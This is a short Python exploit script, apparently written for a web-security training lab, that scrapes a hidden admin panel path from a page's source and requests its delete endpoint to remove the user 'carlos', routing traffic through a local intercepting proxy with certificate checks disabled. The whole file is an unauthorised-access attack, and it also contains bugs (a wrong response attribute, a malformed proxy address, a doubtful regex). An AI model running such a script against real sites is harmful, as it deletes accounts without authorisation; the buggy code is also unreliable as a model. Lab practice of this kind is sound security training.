import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)#blocking the certificate
proxies = {'http': 'http://127.0.0.1:8080','https': 'https://127.0.0:8080'}

def delete_user(url):
    r = requests.get(url,verify=False,proxies=proxies)
    
    #retriving seesion cookies
    session_cookie= r.cookies.get_dict().get('session')
    
    #retrieving the admin pannel
    
    soup = BeautifulSoup(r.txt, 'lxml') # finding the the html content or xml 
    admin_instance = soup.find(text=re.compile("/admin-")) #find the admin instance
    admin_path = re.search("href', '(.*)'",admin_instance).group(1)
    
    
    #delete the carlos user
    cookies = {'session':session_cookie}
    delete_carlos_user = url + admin_path + '/delete?username=carlos'
    r = requests.get(delete_carlos_user,cookies=cookies,verify=False,proxies=proxies)
    if r.status_code == 200:
        print('(+)successfully deleted carlos user')
    else:
        print('(+)failed to delete carlos user')
        print('(-)exiting script')
        sys.exit(1)
    
def main():
    if len(sys.argv)!=2:#if user given  wrong credentials
        print("(+)usage: %s <url>"%sys.argv[0])
        print("(+)Example: %s www.example.com"% sys.argv[0])
        sys.exit(-1)
    # if user given corrct credentials
    url = sys.argv[1]
    print("(+) deleting carlos user..")
    delete_user(url)
    
    
        

if __name__ == '__main__':
    main()